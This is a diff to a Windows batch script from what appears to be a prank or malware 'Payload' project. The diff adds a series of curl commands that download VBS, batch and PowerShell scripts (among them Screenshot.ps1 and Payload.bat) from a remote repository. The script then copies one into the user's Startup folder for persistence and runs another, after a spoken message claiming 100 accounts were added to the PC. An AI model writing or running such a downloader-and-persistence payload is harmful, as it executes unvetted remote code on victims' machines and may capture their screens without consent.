@@ -175,7 +175,14 @@ goto loopstart
 
 :done
 PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.SelectVoice('Microsoft David Desktop'); $speak.Speak('hello user we have just added 100 accounts to your pc')"
-curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/soundplayer.bat"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat"
+curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs"
 @echo off
 copy "./talk2.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 start talk.vbs
